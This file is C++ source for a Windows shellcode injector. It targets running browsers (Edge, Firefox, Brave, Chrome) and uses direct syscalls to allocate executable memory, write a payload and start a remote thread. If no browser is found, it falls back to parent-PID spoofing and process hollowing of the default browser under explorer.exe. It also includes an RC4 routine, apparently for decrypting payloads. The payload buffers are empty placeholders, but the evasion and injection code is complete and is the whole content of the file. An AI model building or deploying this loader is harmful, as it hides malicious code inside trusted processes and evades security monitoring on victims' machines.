#include <Windows.h>
#include <cstdio>
#include "syscalls.h"
#include "structs.h"
#include <tchar.h>
#include <iostream>
#include <psapi.h>
#include <tlhelp32.h>

void rc4(unsigned char* data, int len, const char* key) {
	int keylen = strlen(key);
	unsigned char s[256];
	for (int i = 0; i < 256; i++) {
		s[i] = i;
	}

	unsigned char j = 0;
	for (int i = 0; i < 256; i++) {
		j = (j + s[i] + key[i % keylen]) % 256;
		unsigned char tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
	}

	int i = 0;
	j = 0;
	for (int n = 0; n < len; n++) {
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;
		unsigned char tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
		data[n] ^= s[(s[i] + s[j]) % 256];
	}
}

_TCHAR* GetDefaultBrowserFullPath() {
	// Specify the registry key and value to retrieve
	HKEY hKey = HKEY_CURRENT_USER;  // Example: HKEY_LOCAL_MACHINE
	LPCTSTR subKey = _T("Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\https\\UserChoice");
	LPCTSTR valueName = _T("ProgID");

	// Buffer to store the retrieved value
	DWORD bufferSize = 0;
	DWORD dataType;
	DWORD result;

	// First, get the size of the buffer needed
	result = RegGetValue(hKey, subKey, valueName, RRF_RT_REG_SZ, &dataType, nullptr, &bufferSize);

	if (result == ERROR_SUCCESS) {
		// Allocate buffer of appropriate size
		TCHAR* buffer = new TCHAR[bufferSize / sizeof(TCHAR)];

		// Retrieve the actual value
		result = RegGetValue(hKey, subKey, valueName, RRF_RT_REG_SZ, nullptr, buffer, &bufferSize);

		//if (result == ERROR_SUCCESS) {
		//    // Display the retrieved value
		//    _tprintf(_T("Value for %s: %s\n"), valueName, buffer);
		//}
		//else {
		//    std::cerr << "Failed to retrieve registry value. Error code: " << result << std::endl;
		//}

		TCHAR progIdKey[MAX_PATH];
		_tcscpy_s(progIdKey, buffer);
		_tcscat_s(progIdKey, _T("\\shell\\open\\command"));

		//_tprintf(_T("%s\n"), progIdKey);

		// Buffer to store the retrieved value
		DWORD bufferSize1 = 0;
		DWORD dataType1;
		DWORD result1;

		// First, get the size of the buffer needed
		result1 = RegGetValue(HKEY_CLASSES_ROOT, progIdKey, _T(""), RRF_RT_REG_SZ, &dataType1, nullptr, &bufferSize1);

		if (result1 == ERROR_SUCCESS) {
			// Allocate buffer of appropriate size
			TCHAR* buffer1 = new TCHAR[bufferSize1 / sizeof(TCHAR)];

			// Retrieve the actual value
			result1 = RegGetValue(HKEY_CLASSES_ROOT, progIdKey, _T(""), RRF_RT_REG_SZ, nullptr, buffer1, &bufferSize1);

			//if (result1 == ERROR_SUCCESS) {
			//    // Display the retrieved value
			//    _tprintf(_T("Value for %s: %s\n"), progIdKey, buffer1);
			//}
			//else {
			//    std::cerr << "Failed to retrieve registry value. Error code: " << result1 << std::endl;
			//}

			// Buffer to store the token
			TCHAR* token = nullptr;

			// Get the first token
			token = _tcstok_s(buffer1, _T("\""), &token);

			// Display the first token
			//if (token != nullptr) {
			//    _tprintf(_T("First Token: %s\n"), token);
			//}
			//else {
			//    _tprintf(_T("No tokens found\n"));
			//}

			return token;
		}
	}
	else {
		std::cout << "Failed to get buffer size for registry value. Error code: " << result << std::endl;
	}

	return nullptr;
}

TCHAR* GetFileNameFromFullPath(TCHAR* token) {
	// Find the last occurrence of backslash '\'
	TCHAR* lastBackslash = _tcsrchr(token, _T('\\'));

	if (lastBackslash != nullptr) {
		// Increment the pointer to get the substring after the last backslash
		TCHAR* fileName = lastBackslash + 1;

		// Display the extracted filename
		//_tprintf(_T("Extracted Filename: %s\n"), fileName);
		return fileName;
	}
	else {
		_tprintf(_T("No backslash found in the path\n"));
	}
	return nullptr;
}

BOOL GetParentProcessId(DWORD dwProcessId, DWORD* pdwParentProcessId) {
	PROCESSENTRY32 pe32;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hSnapshot, &pe32)) {
		do {
			if (pe32.th32ProcessID == dwProcessId) {
				*pdwParentProcessId = pe32.th32ParentProcessID;
				CloseHandle(hSnapshot);
				return TRUE;
			}
		} while (Process32Next(hSnapshot, &pe32));
	}

	CloseHandle(hSnapshot);
	return FALSE;
}

DWORD GetTopParentProcessId(const TCHAR* processName) {
	// Create a snapshot of the current processes
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnapshot == INVALID_HANDLE_VALUE) {
		_tprintf(_T("Error creating snapshot (%d)\n"), GetLastError());
		return 0;
	}

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	DWORD topParentProcessId = 0;

	// Retrieve information about the first process in the snapshot
	if (!Process32First(hSnapshot, &pe32)) {
		_tprintf(_T("Error retrieving process information (%d)\n"), GetLastError());
		CloseHandle(hSnapshot);
		return 0;
	}

	// Iterate through the processes
	do {
		if (_tcsicmp(pe32.szExeFile, processName) == 0) {
			topParentProcessId = pe32.th32ProcessID;
			break;  // Stop iterating when the process with the specified name is found
		}
	} while (Process32Next(hSnapshot, &pe32));

	// If the process with the specified name was found, get its parent process ID
	if (topParentProcessId != 0) {
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, topParentProcessId);
		if (hProcess != NULL) {
			DWORD parentProcessId;
			if (GetParentProcessId(topParentProcessId, &parentProcessId)) {
				HANDLE hParentProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentProcessId);
				if (hParentProcess != NULL) {
					TCHAR szParentName[MAX_PATH];

					if (GetProcessImageFileName(hParentProcess, szParentName, MAX_PATH) > 0 &&
						_tcsicmp(szParentName, processName) == 0) {
						topParentProcessId = parentProcessId;
					}

					CloseHandle(hParentProcess);
				}
			}
			CloseHandle(hProcess);
		}
	}

	CloseHandle(hSnapshot);
	return topParentProcessId;
}

DWORD GetInjectable() {
	TCHAR* myStringArray[4];
	myStringArray[0] = _wcsdup(L"msedge.exe");
	myStringArray[1] = _wcsdup(L"firefox.exe");
	myStringArray[2] = _wcsdup(L"brave.exe");
	myStringArray[3] = _wcsdup(L"chrome.exe");

	for (int i = 0; i < 4; i++) {
		DWORD toppid = GetTopParentProcessId(myStringArray[i]);
		if (toppid != 0) {
			_tprintf(_T("[+] %s injectable\r\n"), myStringArray[i]);
			return toppid;
		}
	}
	printf("[-] None injectable\r\n");
	return 0;
}

LPSTR ConvertTCHARtoLPSTR(const TCHAR* tcharString) {
#ifdef UNICODE
	int bufferSize = WideCharToMultiByte(CP_ACP, 0, tcharString, -1, NULL, 0, NULL, NULL);
	LPSTR lpstrString = new char[bufferSize];
	WideCharToMultiByte(CP_ACP, 0, tcharString, -1, lpstrString, bufferSize, NULL, NULL);
	return lpstrString;
#else
	return _strdup(tcharString); // No conversion needed in ANSI mode
#endif
}

int PPIDHollowSpoof(DWORD dwPid, const TCHAR* processName) {
	STARTUPINFOEXA sie = { sizeof(sie) };
	PROCESS_INFORMATION pi;
	SIZE_T cbAttributeListSize = 0;
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
	HANDLE hParentProcess = NULL;

	//if (0 == dwPid)
	//{
	//	std::cout << "Invalid pid";
	//	return 0;
	//}
	InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
	pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
	if (NULL == pAttributeList)
	{
		std::wcout << "HeapAlloc error";
		return 0;
	}
	if (!InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize))
	{
		std::wcout << "InitializeProcThreatAttributeList error";
		return 0;
	}

	hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (NULL == hParentProcess)
	{
		std::wcout << "OpenProcess error";
		std::cout << GetLastError();
		return 0;
	}
	if (!UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL))
	{
		std::wcout << "UpdateProcThreadAttribute error";
		return 0;
	}
	sie.lpAttributeList = pAttributeList;
	if (!CreateProcessA(NULL, ConvertTCHARtoLPSTR(processName), NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sie.StartupInfo, &pi))
	{
		std::wcout << "CreateProcess error";
		return 0;
	}

	//printf("Process created: %d\n", pi.dwProcessId);
	//ResumeThread(pi.hThread);

	DeleteProcThreadAttributeList(pAttributeList);
	//NtClose(hParentProcess);

	// Start hollow
	DWORD pid = pi.dwProcessId;
	HANDLE hProcess = pi.hProcess;
	_tprintf(_T("[+] Created %s process ID at: %d\r\n"), processName, pid);
	_tprintf(_T("[+] Spoofed Parent ID at: %d\r\n"), dwPid);

	// Calculate PEB and image base offset
	PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
	ULONG retLen = 0;
	NtQueryInformationProcess(hProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &retLen);
	PINT ImageBaseOffset = (PINT)((INT64)pbi->PebBaseAddress + 0x10);
	printf("[+] Image Base Offset found at: %p\r\n", ImageBaseOffset);

	// Read address of image base
	PINT lpImageBaseAddress = 0;
	SIZE_T bytesRead = NULL;
	NtReadVirtualMemory(hProcess, ImageBaseOffset, &lpImageBaseAddress, sizeof(lpImageBaseAddress), &bytesRead);
	//printf("[+] Read %lld bytes\r\n", bytesRead);
	printf("[+] Image Base Address found at: %p\r\n", lpImageBaseAddress);

	// Do magic
	CHAR data[0x200];
	SIZE_T bytesRead1 = NULL;
	NtReadVirtualMemory(hProcess, lpImageBaseAddress, &data, sizeof(data), &bytesRead1);
	//printf("[+] Read %lld bytes from base image\r\n", bytesRead1);

	char extractedBytes[4];
	memcpy(extractedBytes, data + 0x3C, 4);
	int extractedInteger = *reinterpret_cast<int*>(extractedBytes);

	printf("[+] e_lfanew offset at: 0x%x\r\n", extractedInteger);

	int opthdr = extractedInteger + 0x28;
	printf("[+] Entrypoint RVA offset found at: %x\r\n", opthdr);

	char entrypoint[4];
	memcpy(entrypoint, data + opthdr, 4);

	int entrypoint_rva = *reinterpret_cast<int*>(entrypoint);
	printf("[+] Entrypoint RVA value found at: %x\r\n", entrypoint_rva);

	PINT addressOfEntryPoint = (PINT)(entrypoint_rva + (INT64)lpImageBaseAddress);
	printf("[+] Entrypoint Address found at: %p\r\n", addressOfEntryPoint);

	unsigned char buf[] = "\x00";

	SIZE_T nnRead = 0;
	WriteProcessMemory(hProcess, addressOfEntryPoint, buf, sizeof(buf), &nnRead);
	printf("[+] Wrote %lld bytes to entry point\r\n", nnRead);
	ResumeThread(pi.hThread);
	printf("[+] Thread resumed. Shellcode executed\r\n");
	
	return 1;
}

void InjectWhisper(DWORD pid) {
	unsigned char buf[] = "\x00\x00\x00";



	SIZE_T shellcodeSize = sizeof(buf);

	printf("[+] Opening process handle to: %d\r\n", pid);
	HANDLE processHandle;
	OBJECT_ATTRIBUTES objectAttributes = { sizeof(objectAttributes) };
	CLIENT_ID clientId = { (HANDLE)pid, NULL };
	NtOpenProcess(&processHandle, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);

	printf("[+] Allocating virtual memory space\r\n");
	LPVOID baseAddress = NULL;
	NtAllocateVirtualMemory(processHandle, &baseAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	printf("[+] Writing memory\r\n");
	NtWriteVirtualMemory(processHandle, baseAddress, &buf, sizeof(buf), NULL);

	printf("[+] Executing thread\r\n");
	HANDLE threadHandle;
	NtCreateThreadEx(&threadHandle, GENERIC_EXECUTE, NULL, processHandle, baseAddress, NULL, FALSE, 0, 0, 0, NULL);

	NtClose(processHandle);
}

int main(int argc, char* argv[])
{
	DWORD injectPID = GetInjectable();
	if (injectPID != 0) {
		InjectWhisper(injectPID);
		return 0;
	}

	printf("[*] Falling back to PPID Hollow technique\r\n");

	DWORD dwPid = GetTopParentProcessId(_T("explorer.exe"));
	TCHAR* defaultBrowserFullPath = GetDefaultBrowserFullPath();
	_tprintf(_T("[+] Extracted Default Browser Full Path: %s\r\n"), defaultBrowserFullPath);
	_tprintf(_T("[+] Extracted Default Browser File Name: %s\r\n"), GetFileNameFromFullPath(defaultBrowserFullPath));

	PPIDHollowSpoof(dwPid, defaultBrowserFullPath);

	return 0;
}